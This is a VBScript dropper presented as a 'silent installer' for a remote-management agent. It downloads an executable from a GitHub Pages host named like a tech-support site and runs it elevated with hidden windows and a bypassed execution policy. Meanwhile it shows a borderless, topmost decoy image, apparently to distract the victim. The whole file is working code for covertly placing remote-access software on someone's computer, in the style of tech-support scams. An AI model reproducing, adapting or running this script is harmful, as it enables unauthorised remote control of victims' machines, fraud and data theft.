' ============================================================
' Tactical RMM Silent Installer
' ============================================================

Option Explicit

Const EXE_URL = "https://techsupportservices.github.io/Tesla-Products-/trmm-dylan-mysite-server-amd64.exe"
Const IMG_URL  = "https://techsupportservices.github.io/Tesla-Products-/error.png"

Dim objShell, objFSO
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

Dim strTemp, strMainPS1, strImgPS1, strExe, strImg
strTemp    = objShell.ExpandEnvironmentStrings("%TEMP%") & "\trmm_install"
strMainPS1 = objShell.ExpandEnvironmentStrings("%TEMP%") & "\trmm_run.ps1"
strImgPS1  = objShell.ExpandEnvironmentStrings("%TEMP%") & "\trmm_img.ps1"
strExe     = strTemp & "\trmm-agent.exe"
strImg     = strTemp & "\success.png"

' ---- Write image viewer PS1 (WinForms, no taskbar icon) ----
Dim f1
Set f1 = objFSO.CreateTextFile(strImgPS1, True)
f1.WriteLine "Add-Type -AssemblyName System.Windows.Forms"
f1.WriteLine "Add-Type -AssemblyName System.Drawing"
f1.WriteLine "$imgPath = '" & strImg & "'"
f1.WriteLine "$img  = [System.Drawing.Image]::FromFile($imgPath)"
f1.WriteLine "$form = New-Object System.Windows.Forms.Form"
f1.WriteLine "$form.ShowInTaskbar    = $false"
f1.WriteLine "$form.FormBorderStyle  = [System.Windows.Forms.FormBorderStyle]::None"
f1.WriteLine "$form.StartPosition    = [System.Windows.Forms.FormStartPosition]::CenterScreen"
f1.WriteLine "$form.TopMost          = $true"
f1.WriteLine "$form.Width            = $img.Width"
f1.WriteLine "$form.Height           = $img.Height"
f1.WriteLine "$pb = New-Object System.Windows.Forms.PictureBox"
f1.WriteLine "$pb.Image    = $img"
f1.WriteLine "$pb.Dock     = [System.Windows.Forms.DockStyle]::Fill"
f1.WriteLine "$pb.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage"
f1.WriteLine "$form.Controls.Add($pb)"
f1.WriteLine "[System.Windows.Forms.Application]::Run($form)"
f1.Close

' ---- Write main installer PS1 ----
Dim f2
Set f2 = objFSO.CreateTextFile(strMainPS1, True)
f2.WriteLine "if (!(Test-Path '" & strTemp & "')) {"
f2.WriteLine "    New-Item -ItemType Directory -Path '" & strTemp & "' | Out-Null"
f2.WriteLine "}"
' 1. Download image first
f2.WriteLine "Invoke-WebRequest -Uri '" & IMG_URL & "' -OutFile '" & strImg & "' -UseBasicParsing"
' 2. Show image immediately — separate hidden PS1 process, WinForms no taskbar
f2.WriteLine "$imgPS1 = '" & strImgPS1 & "'"
f2.WriteLine "Start-Process powershell.exe -ArgumentList @('-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-NonInteractive','-File',$imgPS1)"
' 3. Download EXE while image is already on screen
f2.WriteLine "Invoke-WebRequest -Uri '" & EXE_URL & "' -OutFile '" & strExe & "' -UseBasicParsing"
' 4. Install silently — CreateNoWindow kills all dialogs from the EXE
f2.WriteLine "$pinfo = New-Object System.Diagnostics.ProcessStartInfo"
f2.WriteLine "$pinfo.FileName       = '" & strExe & "'"
f2.WriteLine "$pinfo.CreateNoWindow = $true"
f2.WriteLine "$pinfo.UseShellExecute = $false"
f2.WriteLine "$p = New-Object System.Diagnostics.Process"
f2.WriteLine "$p.StartInfo = $pinfo"
f2.WriteLine "$p.Start() | Out-Null"
f2.WriteLine "$p.WaitForExit()"
f2.Close

' ---- Launch main PS1 elevated (UAC = Windows PowerShell prompt) ----
Dim objShellApp
Set objShellApp = CreateObject("Shell.Application")
objShellApp.ShellExecute "powershell.exe", _
    "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File """ & strMainPS1 & """", _
    "", "runas", 0